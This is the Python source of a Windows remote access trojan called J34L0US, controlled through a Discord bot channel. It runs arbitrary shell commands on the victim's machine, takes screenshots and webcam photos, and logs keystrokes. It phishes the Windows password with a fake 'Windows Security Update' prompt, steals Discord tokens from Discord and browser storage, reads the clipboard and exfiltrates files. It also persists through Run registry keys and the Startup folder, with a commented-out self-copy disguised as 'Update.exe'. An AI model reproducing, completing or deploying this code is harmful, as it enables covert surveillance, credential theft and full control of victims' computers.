############################################ NEEDED BUG FIXES ############################################
#--> let press command press 2 keys at once
#==> finish freeze it cant freeze the keyboard at the same time cuz of the while True loop needed to keep pygame open


import discord
import socket
import subprocess
import pyautogui
import os
import winreg
import random
import string
import re
import json
from urllib.request import Request, urlopen
import cv2
import time
import sys
import ctypes
import keyboard
import threading
from pynput.keyboard import Key, Listener
import pyttsx3
import win32clipboard
import win32api
import win32con
import asyncio
import signal
import webbrowser as web
import pygame
import msvcrt
from ctypes import wintypes


############################################ DEVICE DETAILS ############################################
p = subprocess.Popen("whoami", stdout=subprocess.PIPE, shell=True)
(output, err) = p.communicate()

pc_name = output.decode()
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)


############################################ ADDITIONAL VARIABLES ############################################
logger_status = 0




############################################ COPY FILE TO DIFFERENT LOCATION AND MAKE REGISTRYS ############################################


jealous = "J34L0US.exe"
downloads_folder = "C:/Users/"+hostname+"/Downloads"
documents_folder = "C:/Users/"+hostname+"/Documents"
desktop_folder = "C:/Users/"+hostname+"/Desktop"

##
##if os.path.exists("C:/Update") or os.path.exists("C:/J3"):
##    pass
##else:
##    def find(name, path):
##        for root, dirs, files in os.walk(path):
##            if name in files:
##                return os.path.join(root, name)
##
##    d1 = find(jealous, downloads_folder)
##    d2 = find(jealous, documents_folder)
##    d3 = find(jealous, desktop_folder)
##
##    def update_registry():
##        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
##        winreg.SetValueEx(key, "Update", 0, winreg.REG_SZ, "C:\\Update\\Update.exe")
##        winreg.CloseKey(key)
##
##        
##    def j3_registry():
##        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
##        winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, "C:\\J3\\Update.exe")
##        winreg.CloseKey(key)
##
##    def fake_registry():
##        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
##        try:
##            os.makedirs("C:/J34L0US/aska12/askii64/j34l0us/J34L0US/")
##        except:
##            pass
##        fake_path = "C:/UUsers/{}/DDoccuments/Jeealous.exe".format(hostname)
##        winreg.SetValueEx(key, "J34L0US", 0, winreg.REG_SZ, fake_path)
##
##        # close the registry key
##        winreg.CloseKey(key)
##
##
##    if d1 is not None:
##        try:
##            d1 = d1.replace("/","\\")
##            os.mkdir('C:/Update')
##            os.system('''copy "{}" "C:\\Update\\Update.exe"'''.format(d1))
##
##            update_registry()
##            fake_registry()
##
##        except:
##            d1 = d1.replace("/","\\")
##            try:
##                os.mkdir('C:/J3')
##                os.system('''copy "{}" "C:\\J3\\Update.exe"'''.format(d1))
##
##                j3_registry()
##                fake_registry()
##            except:
##                pass
##
##            
##    if d2 is not None:
##        try:
##            d2 = d2.replace("/","\\")
##            os.mkdir('C:/Update')
##            os.system('''copy "{}" "C:\\Update\\Update.exe"'''.format(d2))
##
##            update_registry()
##            fake_registry()
##
##        except:
##            d2 = d2.replace("/","\\")
##            try:
##                os.mkdir('C:/J3')
##                os.system('''copy "{}" "C:\\J3\\Update.exe"'''.format(d2))
##
##                j3_registry()
##                fake_registry()
##            except:
##                pass
##           
##    if d3 is not None:
##        try:
##            d3 = d3.replace("/","\\")
##            os.mkdir('C:/Update')
##            os.system('''copy "{}" "C:\\Update\\Update.exe"'''.format(d3))
##
##            update_registry()
##            fake_registry()
##
##        except:
##            d1 = d1.replace("/","\\")
##            try:
##                os.mkdir('C:/J3')
##                os.system('''copy "{}" "C:\\J3\\Update.exe"'''.format(d1))
##
##                j3_registry()
##                fake_registry()
##            except:
##                pass

intents = discord.Intents.default()  
client = discord.Client(intents = intents)

@client.event
async def on_ready():
    channel = await client.fetch_channel(connect_channel_address)
    embed = discord.Embed(
        title = "J34L0US",
        description = "New Device {} {} {} Has Connected".format(hostname,ip_address,pc_name)
    )
    await channel.send(embed=embed)


############################################ listen for messages on the server ############################################

@client.event
async def on_message(message):
############################################ LIST ############################################
    print(message.content)
    async def list_command():
        current_channel = message.channel.id
        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")
        else:
            embed = discord.Embed(
                title = "J34L0US",
                description = "{} {} {}".format(hostname, ip_address, pc_name)
                )
            await message.channel.send(embed=embed)

############################################ CMD ############################################
    async def cmd_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                command = message.content.split("cmd ")[1]
                    
                p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                (output, err) = p.communicate()
                output = output.decode()


                embed = discord.Embed(
                    title = "CMD Output From {}".format(pc_name),
                    description = output
                )

                if len(output)<1900:
                    await message.channel.send(embed=embed)
                elif len(output)>1900:
                    num = 0
                    while num < len(output):
                        await message.channel.send(output[num:num+2000])
                        num = num + 2000
            except:
                embed = discord.Embed(
                    title = "{} Cmd".format(hostname),
                    description = "Error with Cmd"
                    )
                await message.channel.send(embed=embed)
############################################ SCREENSHOT ############################################
    async def screenshot_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                screenshot1 = pyautogui.screenshot()

                try:
                    screenshot1.save("C:/temp/image.png".format(hostname))
                except:
                    newpath = "C:/temp/"
                    if not os.path.exists(newpath):
                        os.makedirs(newpath)
                    screenshot1.save("C:/temp/image.png".format(hostname))

                embed = discord.Embed(
                    title = "Screenshot From {}".format(pc_name),
                )
                file = discord.File("C:/temp/image.png".format(hostname), filename="image.png")
                embed.set_image(url="attachment://image.png")

                await message.channel.send(file=file, embed=embed)
                os.remove("C:/temp/image.png".format(hostname))

            except:
                embed = discord.Embed(
                    title = "{} Screenshot".format(hostname),
                    description = "Error with Screenshot"
                    )
                await message.channel.send(embed=embed)
############################################ CLICK ############################################
    async def click_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                temp = message.content.split("click ")[1]
                x = temp.split(" ")[0]
                y = temp.split(" ")[1]
                button1 = temp.split(" ")[2]
                
                x = int(x)
                y = int(y)

                pyautogui.FAILSAFE = False
                pyautogui.click(x, y, button=button1)

                screenshot1 = pyautogui.screenshot()
                screenshot1.save("C:/temp/image.png".format(hostname))
                embed = discord.Embed(
                    title = "Click Screenshot From {}".format(pc_name),
                )
                file = discord.File("C:/temp/image.png".format(hostname), filename="image.png")
                embed.set_image(url="attachment://image.png")

                await message.channel.send(file=file, embed=embed)
                os.remove("C:/temp/image.png".format(hostname))
            except:
                embed = discord.Embed(
                    title = "{} Click".format(hostname),
                    description = "Error with Click"
                    )
                await message.channel.send(embed=embed)
############################################ TYPE ############################################
    async def type_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                command = message.content.split("type ")[1]

                pyautogui.typewrite(command)

                screenshot1 = pyautogui.screenshot()
                screenshot1.save("C:/temp/image.png".format(hostname))
                embed = discord.Embed(
                    title = "Type Screenshot From {}".format(pc_name),
                )
                file = discord.File("C:/temp/image.png".format(hostname), filename="image.png")
                embed.set_image(url="attachment://image.png")

                await message.channel.send(file=file, embed=embed)
                os.remove("C:/temp/image.png".format(hostname))
            except:
                embed = discord.Embed(
                    title = "{} Type".format(hostname),
                    description = "Error with Type"
                    )
                await message.channel.send(embed=embed)
############################################ PRESS ############################################
    async def press_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                command = message.content.split("press ")[1]

                pyautogui.hotkey(command)

                screenshot1 = pyautogui.screenshot()
                screenshot1.save("C:/temp/image.png".format(hostname))
                embed = discord.Embed(
                    title = "Press Screenshot From {}".format(pc_name),
                )
                file = discord.File("C:/temp/image.png", filename="image.png")
                embed.set_image(url="attachment://image.png")

                await message.channel.send(file=file, embed=embed)
                os.remove("C:/temp/image.png".format(hostname))
            except:
                embed = discord.Embed(
                    title = "{} Press".format(hostname),
                    description = "Error with Press"
                    )
                await message.channel.send(embed=embed)
############################################ CAMERA ############################################
    async def camera_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")


        else:
            try:
                for i in range(5):
                    temp = "C:/temp"
                    camera_port = i
                    camera = cv2.VideoCapture(camera_port)
                    #time.sleep(0.1)
                    return_value, image = camera.read()
                    cv2.imwrite(temp + r"\cameraphoto.png", image)

                    embed = discord.Embed(
                        title = "Camera Photo From {}".format(pc_name),
                    )

                    file = discord.File("C:/temp/cameraphoto.png", filename="cameraphoto.png")
                    embed.set_image(url="attachment://cameraphoto.png")

                    await message.channel.send(file=file, embed=embed)
                    
                    os.remove("C:/temp/cameraphoto.png")

            except:
                embed = discord.Embed(
                    title = "{} {} {} Camera".format(hostname, ip_address, pc_name),
                    description = "Error taking photo"
                )

                await message.channel.send(embed=embed)
############################################ MSG BOX ############################################
    async def msg_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")
        else:
            try:
                text = message.content.split("msg ")[1]

                title, sep, message1 = text.partition('|')
                message1 = message1.strip()

                filevbs = open("C:/temp/msg.vbs", "w", encoding = "utf-8")
                filevbs.write('''x=MsgBox("{}",0+16,"{}")'''.format(message1,title))
                filevbs.close()
                

                    
                os.startfile("C:/temp/msg.vbs")
                time.sleep(1)
                os.remove("C:/temp/msg.vbs")

                embed = discord.Embed(
                    title = "{} {} {} Message Box".format(hostname, ip_address, pc_name),
                    description = "Successfully Created Message Box"
                )

                await message.channel.send(embed=embed)
                
            except:
                embed = discord.Embed(
                    title = "{} {} {} Message Box".format(hostname, ip_address, pc_name),
                    description = "Error Creating Message Box"
                )

                await message.channel.id.send(embed=embed)
############################################ FAKE LOGIN ############################################
    async def login_command():
        current_channel = message.channel.id
        
        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
                cmd92 = 'echo $cred.getnetworkcredential().password;'
                full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
                instruction = full_cmd
                def shell():   
                    output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    return output
                result = str(shell().stdout.decode('CP437'))

                embed = discord.Embed(
                    title = "{} {} {}".format(hostname, ip_address, pc_name),
                    description = "Command Ran Successfully"
                )

                await message.channel.send(embed=embed)
                
                embed = discord.Embed(
                    title = "{} {} {}".format(hostname, ip_address, pc_name),
                    description = "Inputted Password Is: {}".format(result)
                )
                
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(
                    title = "{} {} {} Login".format(hostname, ip_address, pc_name),
                    description = "Something Went Wrong"
                )
############################################ WALLPAPER ############################################
    async def wallpaper_command():
        current_channel = message.channel.id
        
        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                path = "C:/temp/wallpaper.jpg"
                await message.attachments[0].save(path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)

                embed = discord.Embed(
                    title = "{} Wallpaper".format(hostname),
                    description = "Successfully changed wallpaper"
                    )
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(
                    title = "{} Wallpaper".format(hostname),
                    description = "Error changing wallpaper"
                    )
                await message.channel.send(embed=embed)
############################################ DOWNLOAD ############################################
    async def download_command():
        current_channel = message.channel.id
        
        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                if str(message.attachments) == "[]": # Checks if there is an attachment on the message
                    pass
                else: # If there is it gets the filename from message.attachments
                    split_v1 = str(message.attachments).split("filename='")[1]
                    filename = str(split_v1).split("' ")[0]
                    await message.attachments[0].save("C:/temp/{}".format(filename))

                    embed = discord.Embed(
                        title = "{} Download".format(hostname),
                        description = "Successfully downloaded file"
                        )
                    await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(
                    title = "{} Download".format(hostname),
                    description = "Error downloading file"
                    )
                await message.channel.send(embed=embed)
############################################ UPLOAD ############################################
    async def upload_command():
        path = message.content.split("upload ")[1]
        path = path.replace("\\","/")
        path = path.replace("//","/")


        if os.path.exists(path):
            embed = discord.Embed(
                title = "File From {}".format(pc_name)
            )
            try:
                file = discord.File(path)

                await message.channel.send(embed=embed, file=file)
            except:
                embed = discord.Embed(
                    title = "Error from {}".format(pc_name),
                    description = "Given File Is Probably Too Large"
                )
        else:
            embed = discord.Embed(
                title = "Error from {}".format(pc_name),
                description = "Path Given Doesnt Exist"
            )

            await message.channel.send(embed=embed)
############################################ REGISTRY ############################################
    async def registry_command():
        loc = message.content.split("registry ")[1]
        path = loc.split("|")[0]
        name = loc.split("|")[1]

        path = path.strip()
        name = name.strip()

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
            winreg.CloseKey(key)

            embed = discord.Embed(
                title = "{} {} {}".format(hostname, ip_address, pc_name),
                description = "Successfully Created New Registry"
            )

            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(
                title = "{} {} {}".format(hostname, ip_address, pc_name),
                description = "Error Making Registry"
            )

            await message.channel.send(embed=embed)
############################################ STARTUP ############################################
    async def startup_command():
        path = message.content.split("startup ")[1]
        startup = "C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup".format(hostname)
        try:
            os.system('''copy "{}" "{}"'''.format(path,startup))
            embed = discord.Embed(
                title = "{} Startup".format(hostname),
                description = "Successfully moved file to startup"
                )
        except:
            embed = discord.Embed(
                title = "{} Startup".format(hostname),
                description = "Error moving file to startup"
                )
############################################ TOKEN ############################################
    async def discord_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            def find_tokens(path):
                path += '\\Local Storage\\leveldb'

                tokens = []

                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue

                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                tokens.append(token)
                return tokens


            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')

            paths = {
                'Discord': roaming + '\\Discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Discord PTB': roaming + '\\discordptb',
                'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
            }


            for platform, path in paths.items():
                if not os.path.exists(path):
                    continue

                tokens = find_tokens(path)


            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
            }

            embed = discord.Embed(
                title = "Discord Token:",
                description = tokens
            )

            await message.channel.send(embed=embed)



############################################ KEYLOGGER ############################################

    async def keylogger_start_command():
        def create_threads():
            global t
            t = threading.Thread(target=logger)
            t.start()
        create_threads()
        embed = discord.Embed(
            title = "{} Keylogger".format(hostname),
            description = "Keylogger successfully started"
            )
        await message.channel.send(embed=embed)
        
    def logger():
        logger_path = "C:\\Users\\{}\AppData\\Local\\logger.txt".format(hostname)

        def on_press(key):
                f = open(logger_path, "a")
                f.write(str(key))
                f.close()

        def on_release(key):
            pass

        # Collect events until released
        global listener
        with Listener(
                on_press=on_press,
                on_release=on_release) as listener:
            listener.join()
                
    async def keylogger_stop_command():
        try:
            listener.stop()
            embed = discord.Embed(
                title = "{} Keylogger".format(hostname),
                description = "Keylogger seccessfully stopped"
                )
            await message.channel.send(embed=embed)
        except:
            embed = discord.Embed(
                title = "{} Keylogger".format(hostname),
                description = "Keylogger isnt running"
                )
            await message.channel.send(embed=embed)

############################################ DUMP KEYLOGGER ############################################
    async def keylogger_dump_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            logger_path = "C:\\Users\\{}\AppData\\Local\\logger.txt".format(hostname)
            f = open(logger_path, "r")
            content = f.readlines()
            num = 0
            num1 = num + 2000
            while True:
                if num < len(content):
                    embed = discord.Embed(
                        title = "Keylogger content from {}".format(hostname),
                        description = content[num:num1]
                        )
                    num = num + 2000
                    await message.channel.send(embed=embed)
                else:
                    break

############################################ TTS ############################################
    async def tts_command():
        current_channel = message.channel.id

        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                engine = pyttsx3.init()

                text = message.content.split("tts ")[1]

                engine.say(text)
                engine.runAndWait()

                embed = discord.Embed(
                    title = "{} TTS".format(hostname),
                    description = "TTS ran successfully"
                    )
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(
                    title = "{} TTS".format(hostname),
                    description = "TTS something went wrong"
                    )
                await message.channel.send(embed=embed)





############################################ CLIPBOARD ############################################
    async def get_clipboard_command():
        current_channel = message.channel.id
        
        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                win32clipboard.OpenClipboard()
                clipboard = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                embed = discord.Embed(
                    title = "{} Clipboard Contents".format(hostname),
                    description = clipboard
                    )
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(
                    title = "{} Clipboard Error".format(hostname),
                    description = "Error getting Clipboard contents"
                    )
                await message.channel.send(embed=embed)

    async def set_clipboard_command():
        current_channel = message.channel.id
        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:

                content = message.content.split("clipboard ")[1]
                
                win32clipboard.OpenClipboard()
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(content)
                win32clipboard.CloseClipboard()

                embed = discord.Embed(
                    title = "{} Set Clipboard".format(hostname),
                    description = "Successfully set Clipboard to {}".format(content)
                    )
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(
                    title = "{} Set Clipboard Error".format(hostname),
                    description = "Error setting Clipboard"
                    )
                await message.channel.send(embed=embed)

############################################ WEBSITE ############################################

    async def website_command():
        current_channel = message.channel.id
        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            website = message.content.split("web ")[1]

            print(website)
            try:
                web.open_new_tab(website)

                embed = discord.Embed(
                    title = "{} website".format(hostname),
                    description = "Opened website"
                    )
                await message.channel.send(embed=embed)
            except:
                embed = discord.Embed(
                    title = "{} website".format(hostname),
                    description = "Error opening website"
                    )
                await message.channel.send(embed=embed)
                
            
############################################ FREEZE ############################################
    async def stop_freeze():
        try:
            pygame.quit()
            embed = discord.Embed(
                title = "{} freeze".format(hostname),
                description = "Successfully stopped freeze"
                )

            await message.channel.send(embed=embed)

        except:
            embed = discord.Embed(
                title = "{} freeze".format(hostname),
                description = "Error stopping freeze"
                )

            await message.channel.send(embed=embed)

    
    async def freeze_command():
        current_channel = message.channel.id
        if int(current_channel) != connect_channel_address:
            await message.channel.send("Ha Nice Try Buddy")

        else:
            try:
                def running():
                    path = message.content.split("freeze ")[1]

                    pygame.init()

                    screen_width = 10000
                    screen_height = 10000
                    screen = pygame.display.set_mode((screen_width, screen_height))

                    image = pygame.image.load(path)

                    image_x = screen_width/2 - image.get_width()/2
                    image_y = screen_height/2 - image.get_height()/2


                    screen.blit(image, (image_x, image_y))

                    pygame.display.update()

                
                    while True:
                        for event in pygame.event.get():
                            if event.type == pygame.KEYDOWN:
                                if event.key == "q":
                                    pass

                def create_threads1():
                    global freeze_threads
                    freeze_threads = threading.Thread(target=running)
                    freeze_threads.start()
                create_threads1()

        
            except:
                embed = discord.Embed(
                    title = "{} freeze".format(hostname),
                    description = "Error starting freeze"
                    )

                await message.channel.send(embed=embed)



############################################ MAIN ############################################
    if message.author == client.user:
        return
    else:
        pass


    if message.content == "list":
        await list_command()
    else:
        pass

############################################ command prompt commands ############################################
    if "!cmd" in message.content and hostname in message.content or ip_address in message.content or "all !cmd" in message.content:
        await cmd_command()
############################################ send an ss of current view ############################################
    if "!screenshot" in message.content and hostname in message.content or ip_address in message.content or "all !screenshot" in message.content:
        await screenshot_command()
############################################ command to click anywhere on main monitor ############################################
    if "!click" in message.content and hostname in message.content or ip_address in message.content or "all !click" in message.content:
        await click_command()
############################################ comamnd to type anything on victims computer############################################
    if "!type" in message.content and hostname in message.content or ip_address in message.content or "all !type" in message.content:
        await type_command()
############################################ press specific button on keyboard ############################################
    if "!press" in message.content and hostname in message.content or ip_address in message.content or "all !press" in message.content:
        await press_command()
############################################ camera photo ############################################
    if "!camera photo" in message.content and hostname in message.content or ip_address in message.content or "all !camera photo" in message.content:
        await camera_command()
############################################ make message box appear ############################################
    if "!msg" in message.content and hostname in message.content or ip_address in message.content or "all !msg" in message.content:
        await msg_command()
############################################ fake windows login prompt ############################################
    if "!login" in message.content and hostname in message.content or ip_address in message.content or "all !login" in message.content:
        await login_command()
############################################ change wallpaper ############################################
    if "!wallpaper" in message.content and hostname in message.content or ip_address in message.content or "all !wallpaper" in message.content:
        await wallpaper_command()
############################################ download files from attacker ############################################
    if "!download" in message.content and hostname in message.content or ip_address in message.content or "all !download" in message.content:
        await download_command()
############################################ upload files to attacker ############################################
    if "!upload" in message.content and hostname in message.content or ip_address in message.content or "all !upload" in message.content:
        await upload_command()
############################################ custom registry maker ############################################
    if "!registry" in message.content and hostname in message.content or ip_address in message.content or "all !registry" in message.content:
        await registry_command()
############################################ move a file to startup ############################################
    if "!startup" in message.content and hostname in message.content or ip_address in message.content or "all !startup" in message.content:
        await startup_command()
############################################ token logger ############################################
    if "!discord token" in message.content and hostname in message.content or ip_address in message.content or "all !discord token" in message.content:
        await discord_command()
############################################ keylogger start ############################################
    if "!keylogger start" in message.content and hostname in message.content or ip_address in message.content or "all !keylogger start" in message.content:
        await keylogger_start_command()
############################################ keylogger stop ############################################
    if "!keylogger stop" in message.content and hostname in message.content or ip_address in message.content or "all !keylogger stop" in message.content:
        await keylogger_stop_command()
############################################ keylogger dump ############################################
    if "!keylogger dump" in message.content and hostname in message.content or ip_address in message.content or "all !keylogger dump" in message.content:
        await keylogger_dump_command()
############################################ tts ############################################
    if "!tts" in message.content and hostname in message.content or ip_address in message.content or "all !tts" in message.content:
        await tts_command()
############################################ get clipboard ############################################
    if "!get clipboard" in message.content and hostname in message.content or ip_address in message.content or "all !get clipboard" in message.content:
        await get_clipboard_command()
############################################ set clipboard ############################################
    if "!set clipboard" in message.content and hostname in message.content or ip_address in message.content or "all !set clipboard" in message.content:
        await set_clipboard_command()
############################################ open website ############################################
    if "!web" in message.content and hostname in message.content or ip_address in message.content or "all !web" in message.content:
        await website_command()
############################################ freeze ############################################
    if "!freeze" in message.content and hostname in message.content or ip_address in message.content or "all !freeze" in message.content:
        await freeze_command()
        
    if "!unfreeze" in message.content and hostname in message.content or ip_address in message.content or "all !unfreeze" in message.content:
        await stop_freeze()
























